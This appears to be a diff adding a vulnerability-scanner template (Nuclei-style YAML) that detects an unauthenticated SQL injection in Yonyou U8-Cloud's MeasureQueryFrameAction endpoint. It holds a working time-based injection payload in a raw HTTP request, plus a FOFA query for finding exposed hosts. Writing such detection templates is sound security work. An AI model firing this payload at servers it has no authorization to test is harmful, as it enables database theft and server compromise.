@@ -1,0 +1,31 @@
+id: yonyou-u8-cloud-measurequeryframeaction-sqli
+
+info:
+  name: Yonyou U8-Cloud MeasureQueryFrameAction - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    There is an SQL injection vulnerability at the Yonyou U8 Cloud MeasureQueryFrameAction interface, which allows unauthenticated remote attackers to not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator backend passwords, site user personal information), but also write trojans to the server in high privilege situations to further gain access to the server system.
+  reference:
+    - https://mp.weixin.qq.com/s/81DgQlMg1I94oD93dScs0A
+  metadata:
+    fofa-query: app="用友-U8-Cloud"
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+          - contains(body, "正在执行")
+          - contains(body, "iUFO")
+        condition: and
